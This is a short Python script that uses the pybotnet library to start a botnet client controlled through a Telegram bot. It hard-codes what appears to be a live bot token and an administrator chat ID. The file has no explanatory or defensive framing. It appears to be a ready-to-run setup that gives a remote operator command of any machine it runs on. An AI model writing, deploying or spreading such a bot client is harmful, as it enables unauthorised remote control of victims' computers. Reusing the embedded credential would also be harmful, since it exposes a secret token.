from pybotnet import BotNet, TelegramEngine

TOKEN = "8874002088:AAFOaFfncBpUVdp13_MQ5xmfCmAZt6B8fY0"
ADMIN_ID = 7310015764

engine = TelegramEngine(token=TOKEN, admin_chat_id=ADMIN_ID)
botnet = BotNet(engine)

if __name__ == "__main__":
    botnet.run()
